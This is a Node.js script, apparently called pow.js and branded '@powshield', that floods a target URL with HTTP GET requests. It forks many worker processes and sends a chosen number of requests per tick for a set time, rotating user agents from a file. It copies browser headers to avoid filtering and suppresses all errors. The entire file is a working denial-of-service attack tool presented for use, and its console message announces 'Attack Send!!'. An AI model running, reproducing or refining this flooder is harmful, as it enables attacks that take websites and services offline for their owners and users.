const http = require('http');
const url = require('url');
const net = require('net');
const fs = require('fs');
const cluster = require('cluster');

if (process.argv.length <= 5) {
  console.log('node pow.js <url> <port> <connect 1 - 9999> <threads> <time> [@powshield]');
  process.exit(-1);
}

const target = process.argv[2];
const parsed = url.parse(target);
const host = parsed.host;
const rps = process.argv[4];
const threads = process.argv[5];
const time = process.argv[6];

let customPort;
if (process.argv.length > 3) {
  customPort = process.argv[3];
} else {
  customPort = parsed.port || (parsed.protocol === 'https:' ? '443' : '80');
}

require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

process.on('uncaughtException', function (error) {});
process.on('unhandledRejection', function (error) {});

let userAgents = [];
try {
  userAgents = fs.readFileSync('ua.txt', 'utf8').split('\n');
} catch (error) {
  console.error('you dont have ua go download!! ua.txt' + error);
  process.exit(-1);
}

const nullHexs = [
  "\x00",
  "\xFF",
  "\xC2",
  "\xA0"
];

if (cluster.isMaster) {
  for (let i = 0; i < threads; i++) {
    cluster.fork();
  }
  
  console.log('Attack Send!! [@powshield]');
  setTimeout(() => {
    process.exit(1);
  }, time * 1000);
} else {
  startFlood();
}

function startFlood() {
  const interval = setInterval(() => {
    for (let i = 0; i < rps; i++) {
      const options = {
        host: host,
        port: customPort,
        path: parsed.path,
        method: 'GET',
        headers: {
          'Host': host,
          'DNT': '1',
          'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
          'Accept-Language': 'en-US,en;q=0.9',
          'Accept-Encoding': 'gzip, deflate, br',
          'Pragma': 'no-cache',
          'Cache-Control': 'max-age=0',
          'Upgrade-Insecure-Requests': '1',
          'Connection': 'keep-alive'
        },
      };

      const request = http.request(options);
      request.setHeader('Host', host);
      request.setHeader('DNT', '1');
      request.setHeader('User-Agent', userAgents[Math.floor(Math.random() * userAgents.length)]);
      request.setHeader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3');
      request.setHeader('Accept-Language', 'en-US,en;q=0.9');
      request.setHeader('Accept-Encoding', 'gzip, deflate, br');
      request.setHeader('Pragma', 'no-cache');
      request.setHeader('Cache-Control', 'max-age=0');
      request.setHeader('Upgrade-Insecure-Requests', '1');
      request.setHeader('Connection', 'keep-alive');
      request.end();
    }
  });

  setTimeout(() => clearInterval(interval), time * 1000);
}
